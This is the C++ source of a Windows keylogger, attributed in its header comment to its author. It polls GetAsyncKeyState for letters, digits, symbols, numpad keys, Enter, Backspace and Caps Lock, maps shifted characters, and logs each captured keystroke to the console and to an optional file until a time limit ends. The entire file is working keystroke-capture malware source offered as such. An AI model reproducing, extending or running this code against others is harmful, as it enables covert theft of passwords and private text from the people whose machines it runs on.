/*
	Windows keylogger written by John Hippisley
*/

#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <time.h>

#define KEYS 65

char* file;
int maxtime;

char lowc[] = " abcdefghijklmnopqrstuvwxyz1234567890`-=[]\\;',./0123456789*+,-./";
char uprc[] = " ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()~_+{}|:\"<>?0123456789*+,-./";
int code[] =
	 {' ','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R',
        'S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0',VK_OEM_3,
        VK_OEM_MINUS,VK_OEM_PLUS,VK_OEM_4,VK_OEM_6,VK_OEM_5,VK_OEM_1,VK_OEM_7,VK_OEM_COMMA,
        VK_OEM_PERIOD,VK_OEM_2,VK_NUMPAD0,VK_NUMPAD1,VK_NUMPAD2,VK_NUMPAD3,VK_NUMPAD4,
        VK_NUMPAD5,VK_NUMPAD6,VK_NUMPAD7,VK_NUMPAD8,VK_NUMPAD9,VK_MULTIPLY,VK_ADD,VK_SEPARATOR,
        VK_SUBTRACT,VK_DECIMAL,VK_DIVIDE};

void logs(const char* characters)
{
    std::cout << characters;
    if(file != 0)
    {
        FILE* fptr = fopen(file, "a+");
        for(int i = 0; characters[i] != 0; ++i) fputc(characters[i],fptr);
        fclose(fptr);
    }
}

void log(char character)
{
    std::cout << character;
    if(file != 0)
    {
        FILE* fptr = fopen(file, "a+");
        fputc(character,fptr);
        fclose(fptr);
    }
}

unsigned getState(int i)
{
    unsigned state = GetAsyncKeyState(i);
    if(state & 1) return 1;
    else return 0;
}

int main(int argc, char** argv)
{
    Sleep(1000); // Sleep a second before starting to log keystates
    time_t start = time(0);
	// Handle args
    for(int i = 0; i < argc; ++i)
    {
        if(strcmp(argv[i], "-f") == 0 && i + 1 < argc) file = argv[i + 1];
        else if(strcmp(argv[i], "-t") == 0 && i + 1 < argc)	maxtime = atoi(argv[i + 1]);
    }
    logs("[STARTED LOGGING]\n");
    while(true)
    {
        if(GetAsyncKeyState(VK_CAPITAL) & 1) logs("<CAPITAL>");
        if(GetAsyncKeyState(VK_RETURN) & 1) logs("<ENTER>\n");
        if(GetAsyncKeyState(VK_BACK) & 1) logs("<BACK>");

        for(int i = 0; i < KEYS; ++i)
        {
            int state = getState(code[i]);
            if(state) // Key is being pressed
            {
                if(state == 1 && GetAsyncKeyState(VK_SHIFT)) log(uprc[i]);
                else if(state == 1) log(lowc[i]);
            }
        }
        double seconds_since_start = difftime( time(0), start);
        if((int)seconds_since_start >= maxtime) break;
    }
    logs("[FINISHED LOGGING]\n");
}

